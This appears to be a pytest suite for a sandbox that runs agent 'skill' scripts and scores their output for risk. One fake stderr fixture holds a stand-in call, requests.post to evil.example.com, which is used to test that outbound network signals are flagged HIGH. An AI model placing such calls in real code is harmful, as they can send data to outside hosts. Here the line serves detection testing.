from pathlib import Path
from skill_manager.core.sandbox import (
    RemoteSandboxRunner,
    SandboxConfig,
    SandboxRunner,
    build_probe_plan,
    discover_probe_entrypoint,
    get_sandbox_runner,
)


def test_discover_probe_entrypoint_prefers_scripts_directory(tmp_path):
    skill_dir = tmp_path / "skill"
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\nname: demo\ndescription: d\n---\n", encoding="utf-8")
    (scripts_dir / "run.py").write_text("print('ok')\n", encoding="utf-8")
    (skill_dir / "helper.py").write_text("print('helper')\n", encoding="utf-8")

    assert discover_probe_entrypoint(skill_dir) == "scripts/run.py"


def test_sandbox_runner_reports_unavailable_without_docker(tmp_path, monkeypatch):
    skill_dir = tmp_path / "skill"
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\nname: demo\ndescription: d\n---\n", encoding="utf-8")
    (scripts_dir / "run.py").write_text("print('ok')\n", encoding="utf-8")

    monkeypatch.setattr("skill_manager.core.sandbox.shutil.which", lambda _: None)

    runner = SandboxRunner(SandboxConfig(runtime="docker"))
    result = runner.run_probe(skill_dir, "scripts/run.py")

    assert result.executed is False
    assert result.available is False
    assert "Docker" in (result.reason or "")


def test_build_probe_plan_prefers_help_for_argparse_scripts(tmp_path):
    skill_dir = tmp_path / "skill"
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\nname: demo\ndescription: d\n---\n", encoding="utf-8")
    (scripts_dir / "run.py").write_text(
        "import argparse\nparser = argparse.ArgumentParser()\nparser.parse_args()\n",
        encoding="utf-8",
    )

    plan = build_probe_plan(skill_dir, "scripts/run.py")

    assert plan.entrypoint == "scripts/run.py"
    assert plan.args == ["--help"]
    assert plan.strategy == "cli-help"


def test_get_sandbox_runner_returns_remote_runner_when_configured():
    runner = get_sandbox_runner(SandboxConfig(runtime="remote", remote_url="http://sandbox.local"))

    assert isinstance(runner, RemoteSandboxRunner)
    assert runner.is_available() is True


def test_sandbox_config_public_dict_masks_remote_api_key():
    config = SandboxConfig(runtime="remote", remote_url="http://sandbox.local", remote_api_key="secret-key-value")

    data = config.public_dict()

    assert "remote_api_key" not in data
    assert data["remote_api_key_configured"] is True
    assert isinstance(data["remote_api_key_masked"], str)


def test_remote_runner_parses_enveloped_response(tmp_path, monkeypatch):
    skill_dir = tmp_path / "skill"
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\nname: demo\ndescription: d\n---\n", encoding="utf-8")
    (scripts_dir / "run.py").write_text("print('ok')\n", encoding="utf-8")

    class FakeResponse:
        def raise_for_status(self):
            return None

        def json(self):
            return {
                "code": 0,
                "message": "success",
                "data": {
                    "stdout": "ok",
                    "stderr": "",
                    "exit_code": 0,
                    "duration_ms": 12,
                },
            }

    monkeypatch.setattr("skill_manager.core.sandbox.httpx.post", lambda *args, **kwargs: FakeResponse())

    runner = RemoteSandboxRunner(SandboxConfig(runtime="remote", remote_url="http://sandbox.local"))
    result = runner.run_probe(skill_dir, "scripts/run.py")

    assert result.executed is True
    assert result.runtime == "remote"
    assert result.exit_code == 0
    assert result.stdout == "ok"
    assert result.duration_ms == 12
    assert result.risk_level == "LOW"
    assert result.max_severity == "SAFE"
    assert "未从输出中提取到明确风险信号" in result.summary


def test_remote_runner_parses_flat_response(tmp_path, monkeypatch):
    skill_dir = tmp_path / "skill"
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\nname: demo\ndescription: d\n---\n", encoding="utf-8")
    (scripts_dir / "run.py").write_text("print('ok')\n", encoding="utf-8")

    class FakeResponse:
        def raise_for_status(self):
            return None

        def json(self):
            return {
                "stdout": "",
                "stderr": "timeout while running",
                "code": 124,
                "message": "timeout",
            }

    monkeypatch.setattr("skill_manager.core.sandbox.httpx.post", lambda *args, **kwargs: FakeResponse())

    runner = RemoteSandboxRunner(SandboxConfig(runtime="remote", remote_url="http://sandbox.local"))
    result = runner.run_probe(skill_dir, "scripts/run.py")

    assert result.executed is True
    assert result.timed_out is True
    assert result.exit_code == 124
    assert any(event.category == "timeout" for event in result.suspicious_events)
    assert result.risk_level == "MEDIUM"
    assert result.max_severity == "MEDIUM"
    assert result.recommendation


def test_remote_runner_extracts_dependency_and_network_signals(tmp_path, monkeypatch):
    skill_dir = tmp_path / "skill"
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\nname: demo\ndescription: d\n---\n", encoding="utf-8")
    (scripts_dir / "run.py").write_text("print('ok')\n", encoding="utf-8")

    class FakeResponse:
        def raise_for_status(self):
            return None

        def json(self):
            return {
                "stdout": "",
                "stderr": "ModuleNotFoundError: No module named 'requests'\nrequests.post('https://evil.example.com')",
                "exit_code": 1,
                "duration_ms": 20,
                "message": "failed",
            }

    monkeypatch.setattr("skill_manager.core.sandbox.httpx.post", lambda *args, **kwargs: FakeResponse())

    runner = RemoteSandboxRunner(SandboxConfig(runtime="remote", remote_url="http://sandbox.local"))
    result = runner.run_probe(skill_dir, "scripts/run.py")

    assert result.executed is True
    assert result.risk_level == "HIGH"
    assert result.max_severity == "HIGH"
    assert any(event.category == "dependency" for event in result.signals)
    assert any(event.category == "network" for event in result.signals)
